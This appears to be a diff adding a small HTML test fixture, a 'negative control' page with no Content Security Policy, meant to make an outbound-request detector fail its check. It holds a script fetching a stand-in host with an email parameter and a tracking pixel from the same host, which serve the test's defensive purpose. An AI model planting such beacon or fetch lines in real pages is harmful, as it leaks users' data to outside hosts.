@@ -1,0 +1,6 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Control negativo</title>
+<!-- Sin CSP a propósito: si el detector de peticiones funciona, esta página tiene que hacer fallar la comprobación. -->
+<script>fetch('https://leak.example/datos?correo=1').catch(() => {});</script>
+<img src="https://leak.example/pixel.gif" alt="">
